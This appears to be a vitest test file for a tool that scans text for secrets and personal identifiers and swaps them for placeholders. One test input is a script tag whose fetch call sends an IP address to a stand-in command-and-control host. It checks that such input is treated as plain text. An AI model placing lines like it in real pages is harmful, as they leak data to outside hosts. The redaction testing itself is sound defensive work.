import { describe, expect, it } from 'vitest';
import { scanText } from './scan';
import { buildCleanText } from './sanitize';
import { createEmptySession, toggleFinding } from './session';
import { DEMO_TEXT } from './demo';
import { SYNTHETIC_STRIPE_SHAPED_KEY } from './synthetic';

describe('overlap resolution', () => {
  it('prefers the bearer token over the JWT inside it', () => {
    const text = 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJkZW1vIjoieCJ9.c2ln';
    const findings = scanText(text);
    expect(findings).toHaveLength(1);
    expect(findings[0].detectorId).toBe('bearer-token');
  });

  it('prefers the internal URL over the hostname it contains', () => {
    const findings = scanText('open https://admin.example.internal/api/v1 now');
    expect(findings.map((f) => f.detectorId)).toEqual(['internal-url']);
  });

  it('prefers the known API key format over a generic assignment', () => {
    const findings = scanText(`api_key=${SYNTHETIC_STRIPE_SHAPED_KEY}`);
    expect(findings.map((f) => f.detectorId)).toEqual(['api-key']);
  });

  it('prefers the file path over the username inside it', () => {
    const findings = scanText(String.raw`log at C:\Users\alex.demo\run.log`);
    expect(findings.map((f) => f.detectorId)).toEqual(['windows-user-path']);
  });

  it('never returns overlapping ranges', () => {
    const findings = scanText(DEMO_TEXT);
    const sorted = [...findings].sort((a, b) => a.start - b.start);
    for (let i = 1; i < sorted.length; i++) {
      expect(sorted[i].start).toBeGreaterThanOrEqual(sorted[i - 1].end);
    }
  });
});

describe('placeholders', () => {
  it('reuses the same placeholder for repeated identical values', () => {
    const text = 'a@example.internal wrote to b@example.internal, cc a@example.internal';
    const findings = scanText(text);
    expect(findings.map((f) => f.placeholder)).toEqual(['[EMAIL_1]', '[EMAIL_2]', '[EMAIL_1]']);
    expect(buildCleanText(text, findings)).toBe(
      '[EMAIL_1] wrote to [EMAIL_2], cc [EMAIL_1]',
    );
  });

  it('numbers placeholders per label independently', () => {
    const findings = scanText('mail a@example.internal from 10.0.0.5');
    expect(findings.map((f) => f.placeholder)).toEqual(['[EMAIL_1]', '[IP_ADDRESS_1]']);
  });
});

describe('sanitization', () => {
  it('leaves disabled findings untouched', () => {
    const text = 'mail a@example.internal from 10.0.0.5';
    let findings = scanText(text);
    const emailId = findings.find((f) => f.detectorId === 'email')!.id;
    findings = toggleFinding(findings, emailId);
    expect(buildCleanText(text, findings)).toBe('mail a@example.internal from [IP_ADDRESS_1]');
  });

  it('preserves formatting exactly around replacements', () => {
    const text = '  line one\t10.0.0.5  \n\n\tline two: 10.0.0.5\r\nend  ';
    const cleaned = buildCleanText(text, scanText(text));
    expect(cleaned).toBe('  line one\t[IP_ADDRESS_1]  \n\n\tline two: [IP_ADDRESS_1]\r\nend  ');
  });

  it('treats HTML/script-like input as plain text', () => {
    const text = '<script>fetch("https://c2.example.internal/x?ip=10.0.0.5")</script>';
    const findings = scanText(text);
    expect(findings.map((f) => f.detectorId)).toEqual(['internal-url']);
    expect(buildCleanText(text, findings)).toBe('<script>fetch("[INTERNAL_URL_1]")</script>');
  });

  it('returns the input unchanged when there are no findings', () => {
    const text = 'nothing sensitive here\n  just text\n';
    expect(buildCleanText(text, scanText(text))).toBe(text);
  });
});

describe('session state', () => {
  it('starts empty and clears to empty', () => {
    expect(createEmptySession()).toEqual({
      sourceText: '',
      privateTermsInput: '',
      termsCaseSensitive: false,
      termsMatchInsideWords: false,
      termsFormat: { id: 'indexed', customTemplate: '[{TYPE}_{INDEX}]' },
      termsLabel: 'CUSTOM_TERM',
      dismissedCandidateKeys: [],
      outputMode: 'safe-share',
      findings: [],
      hasScanned: false,
    });
  });

  it('toggle flips exactly one finding without mutating the original', () => {
    const findings = scanText('mail a@example.internal from 10.0.0.5');
    const toggled = toggleFinding(findings, findings[0].id);
    expect(toggled[0].enabled).toBe(false);
    expect(toggled[1].enabled).toBe(true);
    expect(findings[0].enabled).toBe(true);
  });
});

describe('demo text end to end', () => {
  it('detects each required category in the demo sample', () => {
    const ids = new Set(scanText(DEMO_TEXT).map((f) => f.detectorId));
    for (const expected of [
      'email',
      'ipv4',
      'ipv6',
      'mac-address',
      'private-key',
      'connection-string',
      'api-key',
      'bearer-token',
      'secure-string-literal',
      'windows-user-path',
      'unix-user-path',
      'unc-path',
      'ad-dn',
      'guid-identifier',
      'internal-url',
      'internal-hostname',
      'ticket-id',
      'username',
    ]) {
      expect(ids, `expected detector ${expected} to fire on the demo`).toContain(expected);
    }
  });

  it('gives the repeated demo email one stable placeholder', () => {
    const emails = scanText(DEMO_TEXT).filter((f) => f.detectorId === 'email');
    expect(emails.length).toBeGreaterThanOrEqual(2);
    expect(new Set(emails.map((f) => f.placeholder)).size).toBe(1);
  });

  it('keeps showcase software versions while redacting real addresses', () => {
    const findings = scanText(DEMO_TEXT);
    const cleaned = buildCleanText(DEMO_TEXT, findings);
    expect(cleaned).toContain('agent version 10.0.0.0');
    expect(cleaned).not.toContain('Host IP: 10.42.16.28');
    expect(cleaned).not.toContain('Public edge: 203.0.113.24');
  });
});
